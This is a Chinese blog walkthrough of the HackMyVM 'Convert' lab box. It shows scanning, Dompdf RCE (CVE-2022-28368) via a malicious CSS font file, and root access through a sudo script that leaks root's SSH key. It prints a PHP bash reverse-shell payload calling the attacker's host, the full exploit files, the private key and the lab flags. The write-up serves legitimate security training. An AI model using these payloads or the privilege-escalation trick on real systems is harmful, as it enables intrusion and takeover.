---
{"dg-publish":true,"title":"hackmyvm_Convert","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_Convert.md","permalink":"/安全/靶机/hackmyvm_Convert/","dgPassFrontmatter":true}
---

```table-of-contents
```
# 主机发现

```sh
┌──(root㉿kali)-[~/workspace]
└─# arp-scan --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ac:e0:91, IPv4: 192.168.3.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.3.1     00:50:56:c0:00:08       VMware, Inc.
192.168.3.2     00:50:56:ef:95:8d       VMware, Inc.
192.168.3.5     08:00:27:5d:7b:f0       PCS Systemtechnik GmbH
192.168.3.254   00:50:56:e2:6c:e9       VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.428 seconds (105.44 hosts/sec). 4 responded
┌──(root㉿kali)-[~/workspace]
└─# nmap -sT -min-rate 10000 -p- 192.168.3.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 21:14 EST
Nmap scan report for 192.168.3.5
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:5D:7B:F0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
```
开了两个端口22,80
```sh
┌──(root㉿kali)-[~/workspace]
└─# nmap -sT -sC -sV -O -p22,80 192.168.3.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 21:14 EST
Nmap scan report for 192.168.3.5
Host is up (0.0033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 d8:7a:1e:74:a2:1a:40:74:91:1f:81:9b:05:7c:9a:f6 (ECDSA)
|_  256 28:9f:f8:ce:7b:5d:e1:a7:fa:23:c1:fe:00:ee:63:24 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: HTML to PDF
MAC Address: 08:00:27:5D:7B:F0 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
```



# 初步渗透

目录扫描一下
```sh
┌──(root㉿kali)-[~/…/pentest/Convert/dompdf-rce/exploit]
└─# gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.3.5/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.3.5/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dompdf               (Status: 301) [Size: 169] [--> http://192.168.3.5/dompdf/]
/upload               (Status: 301) [Size: 169] [--> http://192.168.3.5/upload/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
看样子应该是一个dompdf系统

首页是一个可以将网页转化为pdf
![Pasted image 20250218102922.png](/img/user/picture/Pasted%20image%2020250218102922.png)
![Pasted image 20250218103023.png](/img/user/picture/Pasted%20image%2020250218103023.png)
找一下有没有漏洞利用
![Pasted image 20250218150059.png](/img/user/picture/Pasted%20image%2020250218150059.png)

## 漏洞利用尝试
https://github.com/rvizx/CVE-2022-28368
```sh
┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# searchsploit -m php/webapps/51270.py
  Exploit: Dompdf 1.2.1 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51270
     Path: /usr/share/exploitdb/exploits/php/webapps/51270.py
    Codes: CVE-2022-28368
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (698)
Copied to: /root/workspace/pentest/Convert/51270.py
```

```sh
┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# python 51270.py --inject http://192.168.4.8/index.php?url= --dompdf http://192.168.4.8/dompdf


                CVE-2022-28368 - Dompdf RCE PoC Exploit
                Ravindu Wickramasinghe | rvz  - @rvizx9
                https://github.com/rvizx/CVE-2022-28368


[inf]: selected ip address: 192.168.4.4
[inf]: using payload: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.4.4/9002 0>&1'");?>
[inf]: generating exploit.css and exploit_font.php files...
[inf]: starting http server on port 9001..
[inf]: url hash: 5ff78c99f9054b4129d6d197498f0ead
[inf]: filename: exploitfont_normal_5ff78c99f9054b4129d6d197498f0ead.php
[inf]: sending the payloads..


[inf]: success!
[inf]: url: http://192.168.4.8/index.php?url= - status_code: 200
[inf]: terminating the http server..
[ins]: start a listener on port 9002 (execute the command on another terminal and press enter)

nc -lvnp 9002

[ins]: press enter to continue!
[ins]: check for connections!

[err]: failed to trigger the payload!
[inf]: url: http://192.168.4.8/dompdf/lib/fonts/exploitfont_normal_5ff78c99f9054b4129d6d197498f0ead.php - status_code: 404
[inf]: process complete!
```
不知道啥情况一直失败
这个靶场是通过POST请求来访问的
所以我们需要构造一个html来引用恶意css

## 漏洞利用尝试1

https://exploit-notes.hdks.org/exploit/web/dompdf-rce/#exploitation
https://github.com/positive-security/dompdf-rce

```sh
┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# cat exp.html
<link rel="stylesheet" href="http://192.168.4.4:8000/evil.css">

┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# cat evil.css

@font-face {
    font-family:'exploitfont';
    src:url('http://192.168.4.4:8000/evil.php');
    font-weight:'normal';
    font-style:'normal';
}


┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# cat evil.php
...                          
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.4.4/4444 0>&1'");?>

┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# echo -n 'http://192.168.4.4:8000/evil.php' | md5sum
dedd27ad7b9af2a9b930f468093162fe  -
```


```sh
┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.4.10 - - [18/Feb/2025 04:53:53] "GET /exp.html HTTP/1.1" 200 -
192.168.4.10 - - [18/Feb/2025 04:53:53] "GET /evil.css HTTP/1.1" 200 -
192.168.4.10 - - [18/Feb/2025 04:53:53] "GET /evil.php HTTP/1.1" 200 -
```


![Pasted image 20250218175731.png](/img/user/picture/Pasted%20image%2020250218175731.png)
注意这里的名字格式是
**`<font_name>_<font_weight/style>_<md5>.php`**

其中`<font_name>`是css文件中的`font-family`值

```sh
eva@convert:~$ ls
ls
pdf_gen.log
pdfgen.py
user.txt
eva@convert:~$ cat user.txt
cat user.txt
f2be48d6f922bfc0a9bf45b22887c10d
```




# 提权

```sh
eva@convert:~$ sudo -l
sudo -l
Matching Defaults entries for eva on convert:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User eva may run the following commands on convert:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *
```


```sh
eva@convert:~$ ln -s /root/.ssh/id_rsa root
eva@convert:~$ sudo /usr/bin/python3 /home/eva/pdfgen.py -U root -O /tmp/flag1

eva@convert:~$ cd /tmp
cd /tmp
eva@convert:/tmp$ python3 -m http.server
python3 -m http.server
192.168.4.4 - - [18/Feb/2025 15:45:03] "GET /flag1 HTTP/1.1" 200 -
```

```sh
┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# wget http://192.168.4.10:8000/flag1
--2025-02-18 05:15:01--  http://192.168.4.10:8000/flag1
Connecting to 192.168.4.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10636 (10K) [application/octet-stream]
Saving to: ‘flag1’

flag1                        100%[=============================================>]  10.39K  --.-KB/s    in 0.002s

2025-02-18 05:15:02 (6.76 MB/s) - ‘flag1’ saved [10636/10636]


```

然后传到本机上读取一下
![Pasted image 20250218181721.png](/img/user/picture/Pasted%20image%2020250218181721.png)

格式恢复一下
```txt
-----BEGIN OPENSSH PRIVATE KEY-----
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 
-----END OPENSSH PRIVATE KEY-----
```


```sh
┌──(root㉿kali)-[~/workspace/pentest/Convert]
└─# ssh root@192.168.4.10 -i id
Linux convert 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 18 15:20:14 2025 from 192.168.4.4
root@convert:~# id
uid=0(root) gid=0(root) groups=0(root)
root@convert:~# ls
root.txt
root@convert:~# cat root.txt
1cc872dad04d177e6732abbedf1e525b
```


